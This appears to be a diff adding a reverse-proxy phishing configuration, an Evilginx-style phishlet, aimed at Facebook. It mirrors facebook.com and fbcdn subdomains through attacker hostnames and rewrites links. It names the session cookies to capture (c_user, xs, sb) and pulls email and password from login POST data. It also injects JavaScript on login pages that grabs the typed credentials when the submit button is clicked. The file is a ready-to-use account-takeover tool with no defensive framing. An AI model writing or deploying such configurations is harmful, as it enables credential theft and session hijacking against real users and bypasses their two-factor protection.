@@ -1,0 +1,53 @@
+author: '@PTM'
+min_ver: '3.0.0'
+
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'facebook.com', session: true, is_landing: true}
+  - {phish_sub: 'm', orig_sub: 'm', domain: 'facebook.com', session: true, is_landing: false}
+  - {phish_sub: 'static', orig_sub: 'static', domain: 'xx.fbcdn.net', session: false, is_landing: false}
+
+sub_filters:
+  - {triggers_on: 'www.facebook.com', orig_sub: 'www', domain: 'facebook.com', search: 'https://www.facebook.com/', replace: 'https://{hostname}/', mimes: ['text/html']}
+  - {triggers_on: 'm.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: 'https://m.facebook.com/', replace: 'https://{hostname}/', mimes: ['text/html']}
+  - {triggers_on: 'static.xx.fbcdn.net', orig_sub: 'static', domain: 'xx.fbcdn.net', search: 'https://static.xx.fbcdn.net/', replace: 'https://static.{hostname}/', mimes: ['text/html']}
+
+auth_tokens:
+  - domain: '.facebook.com'
+    keys: ['c_user', 'xs', 'sb']
+
+credentials:
+  username:
+    key: 'email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'pass'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'www.facebook.com'
+  path: '/login/device-based/regular/login/'
+
+js_inject:
+  - trigger_domains: ["www.facebook.com"]
+    trigger_paths: ["/login/device-based/regular/login/", "/login.php"]
+    script: |
+      function captureCredentials(){
+        try {
+          let email = document.querySelector('input[name="email"]').value;
+          let pass = document.querySelector('input[name="pass"]').value;
+          let xhr = new XMLHttpRequest();
+          xhr.open("POST", "/login/device-based/regular/login/", true);
+          xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+          xhr.send("email=" + encodeURIComponent(email) + "&pass=" + encodeURIComponent(pass));
+        } catch (e) {}
+      }
+
+      setTimeout(function(){
+        let btn = document.querySelector('button[type="submit"]');
+        if(btn){
+          btn.addEventListener("click", captureCredentials);
+        }
+      }, 1000)
+
